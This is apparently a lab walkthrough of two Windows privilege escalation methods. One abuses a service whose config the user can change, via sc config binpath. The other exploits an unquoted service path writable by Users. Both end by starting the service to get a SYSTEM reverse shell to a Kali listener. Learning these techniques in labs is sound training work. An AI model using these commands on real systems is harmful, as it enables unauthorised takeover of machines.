# ðŸ”¥ Windows Privilege Escalation

### (Method #1)

Firstly we will get a reverse connection to the victim machine and i will be using netcat as the listener on the attacker machine.

Use accesschk.exe to check the "user" account's permissions on the "daclsvc" service:

Note that the "user" account has the permission to change the service config (SERVICE\_CHANGE\_CONFIG).

Query the service and note that it runs with SYSTEM privileges (SERVICE\_START\_NAME):

`sc qc daclsvc`

Modify the service config and set the BINARY\_PATH\_NAME (binpath) to the reverse.exe executable you created:

`sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\"`

Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:

`net start daclsvc`

### (Method #2)

Query the "unquotedsvc" service and note that it runs with SYSTEM privileges (SERVICE\_START\_NAME) and that the BINARY\_PATH\_NAME is unquoted and contains spaces.

`sc qc unquotedsvc`

Using accesschk.exe, note that the BUILTIN\Users group is allowed to write to the C:\Program Files\Unquoted Path Service\ directory:\


`C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"`

Copy the reverse.exe executable you created to this directory and rename it Common.exe:

`copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"`

Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:

`net start unquotedsvc`
